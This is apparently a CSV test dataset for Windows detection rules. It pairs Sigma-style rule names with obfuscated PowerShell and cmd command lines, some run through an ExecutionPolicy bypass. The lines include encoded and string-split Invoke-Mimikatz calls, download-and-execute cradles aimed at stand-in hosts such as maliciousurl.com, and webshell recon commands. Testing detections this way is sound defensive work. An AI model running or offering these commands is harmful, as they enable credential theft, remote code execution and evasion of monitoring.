Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -NonInteractive -exeCUTIonPOLIcY Bypass -CommAND ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -NonInteractive -exeCUTIonPOLIcY Bypass -CommAND ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""& ipconfig & echo""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /C ""&wh^oami&ec^ho""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_wmi_password_never_expire,Password Set to Never Expire via WMI,7864a175-3654-4824-9f0d-f0da18ab27c0,,"powershell.exe -COMMAnd ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance /""Arguments"" @{PasswordExpires=$false}""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -""Command"" ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_wmi_password_never_expire,Password Set to Never Expire via WMI,7864a175-3654-4824-9f0d-f0da18ab27c0,,"powershell.exe -comMand ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -NoproFILe -""Command"" ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&dir&&echo [E]""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&wh^oami&echo""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&wh^oami&ec^ho""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -""Command"" ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -NoproFILe -""Command"" ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -noProFile -""Command"" ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nOLoGo -""NonInteractive"" /""ExecutionPolicy"" Bypass -cOMmaND ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoLogo"" -NonInteractive -exEcutiONPoliCY Bypass /""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -""NonInteractive"" -eXecutiOnpOLIcY Bypass -coMMAnd ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_hktl_soaphound_execution,HackTool - SOAPHound Execution,e92a4287-e072-4a40-9739-370c106bb750,,"""C:\AtomicRedTeam\atomics\T1059.001_x0008_in\SOAPHound.exe"" --user thaim THAIMX --password P@ssword1 --dc 10.0.1.14 --buildcache  -c c:	emp\cache.txt",FALSE,FALSE,FALSE,
t1087,proc_creation_win_hktl_soaphound_execution,HackTool - SOAPHound Execution,e92a4287-e072-4a40-9739-370c106bb750,,"""C:\AtomicRedTeam\atomics\T1059.001_x0008_in\SOAPHound.exe"" --user thaim THAIMX --password P@ssword1 --dc 10.0.1.14 ""--buildcache"" ""-c"" c:	emp\cache.txt",FALSE,FALSE,FALSE,
t1087,proc_creation_win_hktl_soaphound_execution,HackTool - SOAPHound Execution,e92a4287-e072-4a40-9739-370c106bb750,,"""C:\AtomicRedTeam\atomics\T1059.001_x0008_in\SOAPHound.exe"" --user thaim --password P@ssword1 --domain THAIMX --dc 10.0.1.14 --bhdump --cachefilename=c:	emp\cache.txt --outputdirectory=c:	emp	est2",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -NonInteractive -exeCUTIonPOLIcY Bypass -CommAND ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -""NonInteractive"" -EXECUTiONPOLICY Bypass -""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -EncodedCommand JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""& ipconfig & echo""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&dir&&echo [E]""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&wh^oami&echo""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /c ""&wh^oami&ec^ho""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_chopper,Chopper Webshell Process Pattern,fa3c117a-bc0d-416e-a31b-0c0e80653efb,,"cmd.exe /C ""&wh^oami&ec^ho""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -""Command"" ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -NoproFILe -""Command"" ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_hacking,Webshell Hacking Activity Patterns,4ebc877f-4612-45cb-b3a5-8e3834db36c9,,"powershell.exe -noProFile -""Command"" ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nOLoGo -""NonInteractive"" /""ExecutionPolicy"" Bypass -cOMmaND ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nOlOgO -nONINtERaCTIvE -""ExecutionPolicy"" Bypass -CoMManD ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -""NonInteractive"" -eXecutiOnpOLIcY Bypass -coMMAnd ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_net_groups_and_accounts_recon,Suspicious Group And Account Reconnaissance Activity Using Net.EXE,d95de845-b83c-4a9a-8a6a-4fc802ebf6c0,,"powershell.exe -""Command"" ""Get-LocalGroupMember -Group 'Administrators'""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_get_localgroup_member_recon,Suspicious Reconnaissance Activity Using Get-LocalGroupMember Cmdlet,c8a180d6-47a3-4345-a609-53f9c3d834fc,,"powershell.exe -""EncodedCommand"" QUdULUxvY2FsR3JvdXBtZW50IC1Hcm91cCAiRG9tYWluIEFkbWlucyI=",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
